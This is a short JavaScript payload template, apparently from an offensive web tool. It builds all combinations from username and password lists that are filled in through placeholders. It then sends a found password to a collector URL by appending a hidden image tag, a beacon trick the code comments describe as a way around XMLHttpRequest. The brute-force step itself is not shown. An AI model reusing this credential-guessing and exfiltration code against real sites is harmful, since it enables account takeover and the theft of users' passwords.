usernames = ${u}
passwords = ${p}

var combos = []
var i = 0

// combine all possibile usernames and passwords
for(var i = 0; i < usernames.length; i++) {
	for(var j = 0; j < passwords.length; j++) {
		combos.push({"user":usernames[i],"pwd":passwords[j]})
	}
}

function sendPwd(password){
	// this callback is called when the password is found, let's use the img
	// trick instead of XMLHttpRequest
	$("body").append("<img style='visibility:hidden' src='${c}?pwd=password' />");
}
